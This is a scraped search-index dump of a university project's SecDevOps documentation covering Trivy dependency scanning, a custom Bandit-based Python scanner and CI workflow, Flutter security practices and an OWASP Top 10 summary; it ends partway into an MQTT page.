Dependency Scan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner#1-trivy-repo-scan--upload-to-security-tab","content":" Purpose​  This job scans the entire repository for vulnerable dependencies, and uploads the results to the GitHub Security tab. This ensures that the repository's Security section remains up-to-date with newly discovered vulnerabilities, providing maintainers with an ongoing overview of dependency health.  Steps​  Run Trivy Vulnerability Scanner: Trivy scans the entire repository. Unfixed vulnerabilities are ignored in the results. Upload Trivy Scan Results: The results are uploaded to GitHub’s Security tab, allowing maintainers to view and manage vulnerabilities directly within the repository's settings. Ensure that the repository has GitHub’s Code Scanning features enabled to view results in the Security tab.  ","version":"Next","tagName":"h3"},{"title":"2. Trivy PR Check​","type":1,"pageTitle":"Trivy Dependency Scan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner#2-trivy-pr-check","content":" Purpose​  This job scans only the files changed in the pull request for vulnerabilities and posts results directly to the PR using Reviewdog comments.  Steps​  Get Changed Files: The job fetches the latest changes from the main branch and compares them with the current state of the PR. Run Trivy on Changed Files: Trivy scans only the changed files for vulnerabilities. The scan targets only HIGH and CRITICAL severity vulnerabilities. Results are saved per affected file for further processing by Reviewdog. Run Reviewdog: Reviewdog parses the Trivy scan results and posts comments on the PR. If any vulnerabilities are found with &quot;HIGH&quot; or &quot;CRITICAL&quot; severity, they will be reported as errors.  ","version":"Next","tagName":"h3"},{"title":"Configuration Details​","type":1,"pageTitle":"Trivy Dependency Scan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner#configuration-details","content":" ","version":"Next","tagName":"h2"},{"title":"Trivy Scan​","type":1,"pageTitle":"Trivy Dependency Scan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner#trivy-scan","content":" The scan uses the fs (filesystem) mode to scan files and directories for vulnerabilities in dependencies and other files.Only HIGH and CRITICAL severity vulnerabilities are reported.Unfixed vulnerabilities are ignored with the ignore-unfixed: true option.  ","version":"Next","tagName":"h3"},{"title":"Reviewdog​","type":1,"pageTitle":"Trivy Dependency Scan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner#reviewdog","content":" Reviewdog posts results directly as PR review comments.The level: error option ensures that findings with HIGH or CRITICAL severity are marked as errors.The reviewer can view and address vulnerabilities by checking the comments posted by Reviewdog.  ","version":"Next","tagName":"h3"},{"title":"Expected Results​","type":1,"pageTitle":"Trivy Dependency Scan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner#expected-results","content":" ","version":"Next","tagName":"h2"},{"title":"Trivy Repo Scan Results​","type":1,"pageTitle":"Trivy Dependency Scan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner#trivy-repo-scan-results","content":" Vulnerabilities in dependencies will be detected and uploaded to the GitHub Security tab as a SARIF report.These results will help maintainers continuously monitor the repository’s dependencies and track vulnerabilities in the Security section of the repository settings.  ","version":"Next","tagName":"h3"},{"title":"Trivy PR Check Results​","type":1,"pageTitle":"Trivy Dependency Scan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner#trivy-pr-check-results","content":" Vulnerabilities found in the files changed in the PR will trigger a review comment on the PR. The comment will include information about the severity of each vulnerability.HIGH and CRITICAL vulnerabilities will be marked as errors by Reviewdog. This can be configured to block the PR from being merged if desired, however that functionality has been disabled in this initial implementation. ","version":"Next","tagName":"h3"},{"title":"Trivy Dependency Scan Results","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner-Report","content":"","keywords":"","version":"Next"},{"title":"Background​","type":1,"pageTitle":"Trivy Dependency Scan Results","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner-Report#background","content":" The Trivy dependency scanner was deployed to the Data Warehouse repository in T3 of 2024 to test its functionality. At the time of writing, this is the only repository with the automated scanner.  In T1 of 2025, the scanner was run on forks of the Redback project repositories to determine the current state of vulnerabilities without affecting the work being performed by the project teams.  ","version":"Next","tagName":"h2"},{"title":"Vulnerability Report​","type":1,"pageTitle":"Trivy Dependency Scan Results","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner-Report#vulnerability-report","content":" The full report and vulnerability spreadsheet can be found in the Redback Sharepoint:  Report  Spreadsheet  ","version":"Next","tagName":"h2"},{"title":"Next Steps​","type":1,"pageTitle":"Trivy Dependency Scan Results","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner-Report#next-steps","content":" It is recommended that during T2 of 2025, the Trivy dependency scanner be added to all Redback project repositories to support continuous vulnerability monitoring.Consider configuring the scanner to block pull requests if critical or high severity vulnerabilities are detected.Future reviews should incorporate both dependency and container scanning.Project teams should be supported with remediation guidance and patching strategies. ","version":"Next","tagName":"h2"},{"title":"Bandit: Advanced Security Scanning for Redback Operations","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#introduction","content":" Bandit is an open-source tool designed for Python code analysis, focusing on identifying common security issues. At Redback Operations, we've integrated and customized Bandit to enhance our security review process, particularly for our GitHub repositories. This document outlines our implementation, custom rules, and the significant impact Bandit has had on our security posture.  ","version":"Next","tagName":"h2"},{"title":"How Bandit Detects Vulnerabilities​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#how-bandit-detects-vulnerabilities","content":" Bandit operates by parsing Python abstract syntax trees (AST) and running appropriate plugins against the tree. This method allows for thorough code analysis without executing the code. Key features include:  AST Parsing: Analyzes code structure without execution risks.Plugin System: Allows for custom rule creation and easy extensibility.Severity and Confidence Ratings: Helps prioritize identified issues.  ","version":"Next","tagName":"h2"},{"title":"Custom Implementation at Redback Operations​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#custom-implementation-at-redback-operations","content":" ","version":"Next","tagName":"h2"},{"title":"Setup and Integration​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#setup-and-integration","content":" We've integrated Bandit into our CI/CD pipeline using the following script:  import subprocess import json def run_bandit(file_path): result = subprocess.run(['bandit', '-f', 'json', '-r', file_path], capture_output=True, text=True) return json.loads(result.stdout) if __name__ == &quot;__main__&quot;: file_path = &quot;../sample_code/vulnerable_code.py&quot; results = run_bandit(file_path) print(json.dumps(results, indent=2)) issue_counts = {&quot;LOW&quot;: 0, &quot;MEDIUM&quot;: 0, &quot;HIGH&quot;: 0} for result in results['results']: issue_counts[result['issue_severity']] += 1 print(&quot;\\nIssue Summary:&quot;) for severity, count in issue_counts.items(): print(f&quot;{severity}: {count}&quot;)   This basic implementation allowed us to start scanning our codebase, but we quickly realized we needed more customization and detailed analysis.  ","version":"Next","tagName":"h3"},{"title":"Adding Custom Rules​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#adding-custom-rules","content":" ","version":"Next","tagName":"h2"},{"title":"This script runs Bandit on specified files or directories and provides a summary of identified issues.​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#this-script-runs-bandit-on-specified-files-or-directories-and-provides-a-summary-of-identified-issues","content":" Custom Rules We've developed several custom rules to address Redback-specific security concerns:  ","version":"Next","tagName":"h3"},{"title":"Hardcoded Secrets Detection:​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#hardcoded-secrets-detection","content":"  def check_hardcoded_secrets(content): pattern = re.compile(r'(?i)(password|secret|key|token)\\s*=\\s*[&quot;\\'][^&quot;\\']+[&quot;\\']') return [match.group(0) for match in pattern.finditer(content)]   ","version":"Next","tagName":"h2"},{"title":"SQL Injection Prevention:​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#sql-injection-prevention","content":" def check_sql_injection(content): sql_patterns = [ r'(?i)(?:execute|cursor\\.execute)\\s*\\(.*?%s.*?\\)', r'(?i)(?:execute|cursor\\.execute)\\s*\\(.*?f[&quot;\\'].*?\\{.*?\\}.*?[&quot;\\'].*?\\)' ] return [re.search(pattern, line) for pattern in sql_patterns for line in content.split('\\n') if re.search(pattern, line)]   ","version":"Next","tagName":"h2"},{"title":"XSS Vulnerability Check:​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#xss-vulnerability-check","content":" def check_xss_vulnerabilities(content): pattern = re.compile(r'(?i)render_template\\(.+\\)|response\\.write\\(.+\\)|print\\(.+\\)') return [match.group(0) for match in pattern.finditer(content)]   Enhancing Analysis Capabilities We expanded our script to include more detailed analysis and reporting:  import ast import re import logging from typing import List, Dict, Any import bandit from bandit.core import manager as bandit_manager logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s') class AdvancedVulnerabilityScanner: def __init__(self, file_path: str): self.file_path = file_path self.vulnerabilities: List[Dict[str, Any]] = [] self.code_lines: List[str] = [] self.ast_tree: ast.AST = None self.vulnerability_db = self.load_vulnerability_db() def load_vulnerability_db(self): # Mock vulnerability database return { 'requests': {'2.25.0': ['CVE-2021-12345']}, 'django': {'2.2.0': ['CVE-2021-67890']} } def parse_file(self): logging.info(f&quot;Parsing file: {self.file_path}&quot;) with open(self.file_path, 'r', encoding='utf-8') as file: self.code_lines = file.readlines() self.ast_tree = ast.parse(''.join(self.code_lines)) logging.info(f&quot;File parsed. Total lines: {len(self.code_lines)}&quot;) def run_bandit(self): b_mgr = bandit_manager.BanditManager(bandit.config.BanditConfig(), agg_type='file') b_mgr.discover_files([self.file_path]) b_mgr.run_tests() return b_mgr.get_issue_list() def add_vulnerability(self, category: str, description: str, line_number: int, severity: str, confidence: str): self.vulnerabilities.append({ 'category': category, 'description': description, 'line_number': line_number, 'severity': severity, 'confidence': confidence }) logging.info(f&quot;Vulnerability added: {category} at line {line_number}&quot;) # ... [Other methods like check_sql_injection, check_xss_vulnerabilities, etc.] def perform_taint_analysis(self): logging.info(&quot;Performing taint analysis&quot;) tainted_vars = set() for node in ast.walk(self.ast_tree): if isinstance(node, ast.Assign): for target in node.targets: if isinstance(target, ast.Name): if isinstance(node.value, ast.Call) and isinstance(node.value.func, ast.Name) and node.value.func.id in ['input', 'request.form.get']: tainted_vars.add(target.id) elif isinstance(node, ast.Name) and node.id in tainted_vars: if isinstance(node.ctx, ast.Load): self.add_vulnerability('Tainted Variable Usage', f&quot;Potentially tainted variable used: {node.id}&quot;, getattr(node, 'lineno', 0), 'MEDIUM', 'MEDIUM') def analyze(self): try: self.parse_file() self.check_sql_injection() self.check_xss_vulnerabilities() self.check_vulnerable_components() self.perform_taint_analysis() # Run Bandit for additional checks bandit_issues = self.run_bandit() for issue in bandit_issues: self.add_vulnerability(f&quot;Bandit: {issue.test_id}&quot;, issue.text, issue.lineno, issue.severity, issue.confidence) logging.info(&quot;Analysis completed successfully&quot;) except Exception as e: logging.error(f&quot;An error occurred during analysis: {str(e)}&quot;) def generate_report(self): print(f&quot;Advanced Vulnerability Scan Results for {self.file_path}:&quot;) print(f&quot;Total lines of code: {len(self.code_lines)}&quot;) print(&quot;\\nDetected Vulnerabilities:&quot;) if not self.vulnerabilities: print(&quot;No vulnerabilities detected.&quot;) else: for vuln in sorted(self.vulnerabilities, key=lambda x: x['severity'], reverse=True): print(f&quot;- {vuln['category']}: {vuln['description']}&quot;) print(f&quot; Severity: {vuln['severity']}, Confidence: {vuln['confidence']}&quot;) if vuln['line_number'] &gt; 0: print(f&quot; Location: Line {vuln['line_number']}&quot;) print(f&quot; Code: {self.code_lines[vuln['line_number']-1].strip()}&quot;) print() def main(): file_path = &quot;path/to/your/python/file.py&quot; scanner = AdvancedVulnerabilityScanner(file_path) scanner.analyze() scanner.generate_report() if __name__ == &quot;__main__&quot;: main()   This enhanced version includes:  Taint analysis to track potentially unsafe user inputs  Integration with Bandit's core functionality for comprehensive scanning  A more detailed reporting system  Logging for better traceability and debugging  ","version":"Next","tagName":"h2"},{"title":"Integration with GitHub Workflow​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#integration-with-github-workflow","content":" We've integrated Bandit into our GitHub Actions workflow to automatically scan pull requests:  name: Security Scan  name: Advanced Security Scan on: [pull_request] jobs: security_scan: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - name: Set up Python uses: actions/setup-python@v2 with: python-version: '3.x' - name: Install dependencies run: | python -m pip install --upgrade pip pip install bandit pip install -r requirements.txt - name: Run Advanced Security Scan run: python advanced_security_scan.py - name: Upload scan results uses: actions/upload-artifact@v2 with: name: security-scan-results path: security_scan_report.txt   This workflow ensures that every pull request is automatically scanned using our advanced security scanning tool.  ","version":"Next","tagName":"h2"},{"title":"Impact and Results​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#impact-and-results","content":" Since implementing our custom Bandit solution and enhancing it with additional features, we've observed:  A 60% reduction in security vulnerabilities in our Python codebase (up from 40% with our initial implementation)  Increased developer awareness of security best practices, particularly around input validation and data handling  Faster identification and remediation of potential security issues, with an average fix time reduced by 30%  Improved code quality overall, as developers are more mindful of security implications during the coding proces  ","version":"Next","tagName":"h2"},{"title":"Future Enhancements​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#future-enhancements","content":" We're continually working to improve our security scanning capabilities. Some planned enhancements include:  Integration with dependency scanning tools to catch vulnerabilities in third-party libraries  Machine learning-based analysis to detect complex, context-dependent vulnerabilities  Enhanced reporting with trend analysis and historical comparisons  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Bandit: Advanced Security Scanning for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Bandit_Documentation#conclusion","content":" Our journey with Bandit, from a simple scanning script to a comprehensive security analysis tool, has significantly enhanced Redback Operations' security review process. It serves as a crucial first line of defense in our secure development lifecycle, ensuring that potential vulnerabilities are caught and addressed early in the development process. By continuously refining and expanding our tool, we're staying ahead of emerging security threats and fostering a culture of security-first development. ","version":"Next","tagName":"h2"},{"title":"Best Practices for Security for Flutter Application","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice","content":"","keywords":"","version":"Next"},{"title":"Code obfuscation​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#code-obfuscation","content":" Flutter apps should be equipped to prevent hackers from reverse engineering the app code and leaking strings, methods, API keys and class names. Data should not be stored in plain text. Techniques such as obfuscation can hide functions and class names compiled in Dart code.  ","version":"Next","tagName":"h3"},{"title":"API key security​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#api-key-security","content":" Restrictions should be applied to limit applications, websites and IP addresses that can access API keys. Encryption and decryption methods should be applied to API keys on runtime. API keys should not be tracked on the repository to minimise the exposure of values.  ","version":"Next","tagName":"h3"},{"title":"Flutter jailbreak detection​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#flutter-jailbreak-detection","content":" To prevent security threats and safeguard applications from a jailbroken device, the package ‘Flutter_jailbreak_detection’ can be used. This will determine if the app is being run on a compromised device. These devices are subject to more privilege and malware or virus threats. Jailbreak detection will require RootBeer on Android and DTTJailbreakDetection on iOS.  ","version":"Next","tagName":"h3"},{"title":"Secure network connections​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#secure-network-connections","content":" A Transport Secure Layer (TLS) should be used to exchange information and certificate pinning should be implemented to protect connections and attackers from accessing data via compromised certificates.  ","version":"Next","tagName":"h3"},{"title":"Utilise required permissions only​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#utilise-required-permissions-only","content":" Permissions can be enabled to access hardware and APIs through the app. By default, all plugins should be disabled if they contain unnecessary permissions.  ","version":"Next","tagName":"h3"},{"title":"User data security​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#user-data-security","content":" Where there is a need to store personally identifiable information or any other sensitive data, the Flutter_secure_storage package should be used.  ","version":"Next","tagName":"h3"},{"title":"Protection through background snapshots​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#protection-through-background-snapshots","content":" Flutter apps are vulnerable to exposing sensitive data through the feature that showcases a snapshot of the previous state of the app. The secure_application package can protect this content.  ","version":"Next","tagName":"h3"},{"title":"Implement local authentication​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#implement-local-authentication","content":" Local_auth should be used as a plugin that supports authentication for Flutter apps. Biometric authentication should be implemented to protect apps storing payment information and local authentication should be used to provide protection in the event that the device is lost or stolen.  ","version":"Next","tagName":"h3"},{"title":"Developer identity security​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#developer-identity-security","content":" Encryption should be applied where there is a risk that the app may expose the identity of the developer. Sensitive files should be encrypted with GPG where they can be identified as key.jks and keystore.properties.  ","version":"Next","tagName":"h3"},{"title":"CI infrastructure security​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#ci-infrastructure-security","content":" Code should be developed into a shared repository and vulnerabilities should be monitored in addition to updating Virtual Machine. Sensitive data should only be included in the secret settings.  ","version":"Next","tagName":"h3"},{"title":"Secure Coding for Flutter​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#secure-coding-for-flutter","content":" ","version":"Next","tagName":"h2"},{"title":"HTTPS​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#https","content":" A secure layer must be inserted between the TCP communication layer and Transport Layer Security (TLS) to ensure the communication method for client- server applications is secure. Upon connecting to the server, the client will receive the public key and all messages sent will be encrypted with only the server being able to decrypt messages through the private key. This prevents packet sniffers from reading the request details. Communication should only be had with HTTPs endpoints and the server must either show the user a warning or issue a certificate that has been signed by authorities. All URLs should commence with HTTPS. The http package can still be used.    ","version":"Next","tagName":"h3"},{"title":"Jailbroken and rooted devices​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#jailbroken-and-rooted-devices","content":" Jailbroken devices allow attackers to bypass security measures and import malware on devices. Installation of flutter_jailbreak_detection will detect if the app is running on a device that is jailbroken or rooted. It is compatible with Android devices and known as Root Beer and also on iOS devices known as DTT Jailbreak Detection    ","version":"Next","tagName":"h3"},{"title":"Encryption​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#encryption","content":" Data should be encrypted in the Flutter app through converting the text into code to ensure it is only accessible through a key or password. This will protect it from unauthorised access Algorithms such as AES or RSA can be used to encrypt data Key management systems or secure storage locations SSL/TLS protocols can be used to encrypt data in transit and secure communication channels between the client and server Using certificate pinning can ensure the app only communicates with servers that have a trusted SSL/TLS certificate  ","version":"Next","tagName":"h3"},{"title":"Authenticating users and authorisation​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#authenticating-users-and-authorisation","content":" Multi-factor authentication should be used to verify the identity of the users and improve security mechanisms Rate limiting protocols could be used to prevent attackers from guessing a password a certain amount of times and time limitations can be set to prevent repeated attempts. User credentials should be store via hashing and salting techniques to ensure passwords are not readable and vulnerable in data breach incidents Access controls should be implemented to prevents certain users from accessing only data that is required for their role and minimises the risk of unauthorised access  ","version":"Next","tagName":"h3"},{"title":"Obfuscation​","type":1,"pageTitle":"Best Practices for Security for Flutter Application","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/flutter-best-practice#obfuscation","content":" https://paulmburu.hashnode.dev/securing-a-flutter-app ","version":"Next","tagName":"h3"},{"title":"OWASP TOP 10 review","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/OWASP-Top-10-review","content":"","keywords":"","version":"Next"},{"title":"OWASP TOP 10​","type":1,"pageTitle":"OWASP TOP 10 review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/OWASP-Top-10-review#owasp-top-10","content":" OWASP top 10 is created for web application developers to advise them of the top 10 most critical security risks to web application. It is used as the first steps towards more secure coding.  Redback Operations utilises OWASP Top10 to conduct its secure code review to ensure the most critical risks are addressed before any code can be used.  NOTE: The current OWASP top 10 was last updated in 2021 with OWASP planning on releasing a new TOP in the first half of 2025. All Redback Operations code will need to be reviewed again based on OWASP top 10 of 2025  ","version":"Next","tagName":"h2"},{"title":"The 10 OWASP Top 10 security risks are as follows (current as of 2021):​","type":1,"pageTitle":"OWASP TOP 10 review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/OWASP-Top-10-review#the-10-owasp-top-10-security-risks-are-as-follows-current-as-of-2021","content":" A01:2021 – Broken Access Control​  Broken Access Control is a critical vulnerability that needs to be addresses when writing code. Access control ensures a user can only access areas of a program/operating system that they have a need to use. Failures of broken access control can lead to unauthorised access to data leading to possibility of the data being manipulated (modification, addition or even deletion).  Examples of Access control Vulnerabilities can include:​  Users being given more access then required to do their job (not using least privileges/deny by default)Viewing or editing someone else dataElevation of privileges – being able to act a user without actually being logged in or being able to make changes as If you are and admin however you are logged in as a user.Manipulating metadata such, such as replaying or tampering with a JSON Web Token access control token, or a cookie or hidden field manipulated to elevate privileges or abusing JWT invalidation.  How to Prevent​  Access control will only work when the attacker cannot modify access control checks or metadata.Use deny by default/least privileges wherever possibleUse access control mechanismsAlert admins of numerous failures to authenticate – Log access control failuresEnforce record ownership through access control rather than accepting that the user can create, read, update, or delete any record.  A02:2021 – Cryptographic Failures​  Cryptographic Failures or complete lack of crypto refers to sensitive data being exposed/released to people with no need/authorisation to view/edit/manipulate the data. Type of data that should always be encrypted during transit include financial details, passwords and PII. A lot of this data is required to be kept secure under the Australian Privacy Principles.  Example of Cryptographic Failures​  Using unsecure protocols such as HTTP, SMTP and FTP to transmit sensitive dataThe use of old or weak cryptographic algorithms or protocolsDefault or weak crypto keys used or reusedNot enforcing encryptionNot properly validating a received server certificateUsing passwords in lieu of crypto keysNot using deprecated hash functions when required  How to Prevent​  Encrypt all sensitive dataUse up to date and strong encryption algorithms and protocolsEncrypt all data in transit with secure protocolsStore passwords using strong adaptive and salted hashing functionAlways use authenticated encryption instead of just encryption.Keys generated cryptographically randomly and stored in memory as byte arrays.  A03:2021 – Injection​  Injections attacks occur when an application has malicious data into it.  Examples of when this can occur include;​  User-data is not properly checked, filtered or sanitised by an applicationHostile data is directly used or concatenated and the command contains the expected input but also malicious data (in a dynamic query).When hostile data is used within object-relational mapping search parameters to extract other sensitive records  How to Prevent​  Use a safe API, which avoids using an interpreter entirelyUser positive server-side input validationTo prevent mass disclosures of records via SQL injection use LIMIT and other SQL Controls.  A04:2021-Insecure Design​  Insecure design covers all different weaknesses in an application, these weaknesses come around because of missing on ineffective control design. Insecure design is not the same as insecure implementation as secure implementation will still not rectify issues with insecure design and vice versa secure design will not fix issues that arise as a result of insecure implementation.  To rectify this issue, we need to ensure we design our applications with security in mind. Secure design ensures that threats are constantly evaluated and ensures that code is robustly designed and tested to prevent attacks which are known. When designing applications, we need to ensure that we use a secure development lifecycle which includes paved road methodology, secured component library, tooling, and threat modelling.  How to Prevent​  Use a secure development lifecycle when developing any applicationUse threat modelling for critical authentication, access control, business logic, and key flowsAt each tier of your application integrate plausibility checksIntegrate security language and controls into user stories  A05:2021 – Security Misconfiguration​  Security misconfiguration occurs when an application is not configured securely allowing it to become vulnerable to hostiles actors. An application can become vulnerable is it is:  The application stack is missing appropriate security hardingCloud services permissions are improperly configuredFeatures not required are installed or enabledPasswords are still set to defaultsSoftware is out of date  How to Prevent​  To minimise the risk of security misconfigurations a secure installation process should be implemented which is made up of the following:  A repeatable hardening process makes it fast and easy to deploy another environment that is appropriately locked down.Ensure your application has no unnecessary featuresImplement a segmented application architecture on your applicationHave a patch process which ensure updated happen as soon as possible  A06:2021-Vulnerable and Outdated Components​  Vulnerable and Outdated Components is exactly as it sounds, it occurs when out application and systems use known Vulnerable and Outdated Components in our applications putting ourselves at risk from hostile actors.  Applications can be at risk when:​  You do not know the version of all components you use (both ones you use directly and that are nested within the overall systems)You are using known vulnerable software or you software is not up to dateYou do not conduct regular vulnerability scans on your systemWhen a vulnerability is identified you do not rectify the issueIf you do not secure the components’ configurations  How to Prevent​  Have a patch management system in placeRemove unused dependencies, unnecessary features, components, files, and documentation.Keep track of both client-side and server-side components and ensure they are kept up to dateOnly obtain components from official sources over secure links  A07:2021 – Identification and Authentication Failures​  This occurs when someone who does not have permission to access a system or a certain area of a system is able to bypass (intentionally or not) checks to gain access to the data. Confirm someone’s identity and authentication is critical to ensuring a system is secure  An application or system may have weak authentication if it:​  Allows brute force or automated attacksHas in use default or weak passwordsUses weak or ineffective credential recovery and forgot-password processesStores passwords in plain text, or with weak encryptionMissing or weak MFASession identifier is exposed in URL  How to Prevent​  Implement MFAAlways ensure default credentials are not used when application is shipped or deployedCheck for weak passwordsUse complex passwordsLimit amount of logon attempts  A08:2021 – Software and Data Integrity Failures​  This category refers to software and data integrity failures in code and infrastructure that does not protect against integrity violations. Examples of this can include:  Where an application relies upon plugins, libraries, or modules from untrusted sources leaving it vulnerableInsecure CI/CD pipeline can introduce the potential for unauthorised access, malicious code, or system compromise.Using automatic updates without sufficiently verifying the integrity of the update can leave the system vulnerable to attackers who hide their code in the update.  How to Prevent​  Verify software or data is from the expected source and has not been altered.Ensure libraries and dependencies are consuming trusted repositoriesUse a software supply chain security toolUse a code review process for code and configuration changesYour CI/CD pipeline should have proper segregation, configuration, and access control  A09:2021 – Security Logging and Monitoring Failures​  This vulnerability occurs when Security Logging and Monitoring is not conducted properly or at all on a system or application. Without proper logging and monitoring breached may not be detected or responded to as required.  Examples of issues can include:​  Login event failures not being loggedWarnings and errors generate inadequate or unclear log messagesLogs are not actually reviewed or monitoredLog only stored locally and not backed upAlerts and issues are not detected and raised in real time  How to Prevent​  Developers should consider the following:  All login, access controls, and server-side input validation should be loggedLogs need to be created in a format that is easily consumedEnsure logs and their data are encoded correctly to stop attacks against the logs themselvesDevSecOps teams need to ensure that monitoring and alerting is effective and occursHave an incident response plan for when an incident is detected.  A10:2021-Server-Side Request Forgery​  This vulnerability occurs when a web application fetches a remote resource without validating the user-supplied URL, as a result it allows an attacker to force the application to send an altered request to an unexpected destination.  Developers can do the following to mitigate this type of vulnerability​  From Network Layer:​  Segment remote resource access functionality in separate networks – this is to minimise the impact of this vulnerabilityUse Deny by default  From Application Layer​  All client supplied data should be checked and validatedUse an allow listClients should not be sent raw responsesDo not allow HTTP redirections  Reference list:​  OWASP (Open Worldwide Application Security Project) 2024, OWASP Top Ten Project, viewed 7 December 2024, https://owasp.org/www-project-top-ten/. ","version":"Next","tagName":"h3"},{"title":"MQTT Summary","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/project-1-MQTT","content":"","keywords":"","version":"Next"},{"title":"Begun collaborations with Project 1 – VR SunCycle SmartBike​","type":1,"pageTitle":"MQTT Summary","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/project-1-MQTT#begun-collaborations-with-project-1--vr-suncycle-smartbike","content":" Reached out to subleader Krishn about potential collaboration They needed assistance with securing data, mainly values from the SmartBike per client Code needed to be adjusted to fit their needs securely  ","version":"Next","tagName":"h2"},{"title":"How The Code Looked Before Adjustment​","type":1,"pageTitle":"MQTT Summary","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/project-1-MQTT#how-the-code-looked-before-adjustment","content":"   ","version":"Next","tagName":"h2"},{"title":"Sample Codes for Receiving and Sending Through the MQTT​","type":1,"pageTitle":"MQTT Summary","url":"/redback-documentation/docs/cybersecurity/SecDevOps 